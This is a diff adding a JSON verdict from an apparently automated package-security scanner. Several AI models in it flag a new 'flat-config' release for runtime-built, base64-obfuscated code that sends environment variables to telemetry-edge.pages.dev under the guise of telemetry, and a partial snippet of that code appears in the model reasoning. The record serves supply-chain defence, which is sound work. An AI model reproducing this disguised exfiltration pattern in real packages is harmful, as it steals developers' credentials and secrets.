@@ -1,0 +1,48 @@
+{
+  "schema": 1,
+  "promptVersion": 3,
+  "judgedAt": "2026-09-22T19:35:17.275Z",
+  "judgement": {
+    "pkg": "flat-config",
+    "severity": "alarming",
+    "judged": true,
+    "tier": "judge",
+    "verdict": {
+      "meaning": "The new version generates code at runtime from a base64-encoded string that reads process.env and exfiltrates environment variables to an undocumented domain (telemetry-edge.pages.dev) under the guise of telemetry.",
+      "explained": false,
+      "worthWaking": true,
+      "confidence": "high",
+      "note": "Obfuscated runtime code generation sending environment variables to an unknown destination is the hallmark of credential exfiltration."
+    },
+    "second": {
+      "meaning": "The package dynamically builds a function that fetches a URL incorporating an environment variable and sends it to telemetry-edge.pages.dev.",
+      "explained": false,
+      "worthWaking": true,
+      "confidence": "high",
+      "note": ""
+    },
+    "accused": true,
+    "reason": "two models, independently, read this as a payload that was not in the source, reaching the network",
+    "spend": [
+      {
+        "model": "nvidia/NVIDIA-Nemotron-3-Nano-30B-A3B",
+        "costUsd": 0.000115,
+        "simulated": false,
+        "reasoning": "We need to output JSON only with fields meaning, explained, worthWaking, confidence, note. Must not add prose. Must interpret evidence.\n\nEvidence shows \"NOW BUILDS CODE   base64-decode: · chars\" etc. It builds code that does async function fetch(atob(h)+\"/r?k=\"+process.env ... resolves telemetry-edge.pages.dev etc. So it's building code that runs fetch to telemetry-edge.pages.dev, using base64 decode of something (h). It's building code at runtime (function). This matches \"builds and runs code that did not exist in the source\". So meaning: It builds and executes code that contacts telemetry-edge.pages.dev, likely sending telemetry or exfiltrating data. It's suspicious.\n\nExplained?…"
+      },
+      {
+        "model": "nvidia/Nemotron-3-Ultra-550b-a55b",
+        "costUsd": 0.002148,
+        "simulated": false,
+        "reasoning": ""
+      },
+      {
+        "model": "nvidia/nemotron-3-super-120b-a12b",
+        "costUsd": 0.000517,
+        "simulated": false,
+        "reasoning": "We need to output JSON per spec. Determine meaning: The package now builds code via Function from base64-decoded string using process.env etc., resolves and connects to telemetry-edge.pages.dev. So likely exfiltrating env var via HTTP GET request. Meaning: constructing a dynamic function that fetches a URL containing an environment variable and sends it to telemetry-edge.pages.dev. Explained? No public record, so false. WorthWaking? Yes because credentials leaving machine (environment variable) and code built at runtime reaching network => high concern. Confidence high.…"
+      }
+    ],
+    "costUsd": 0.00278
+  }
+}
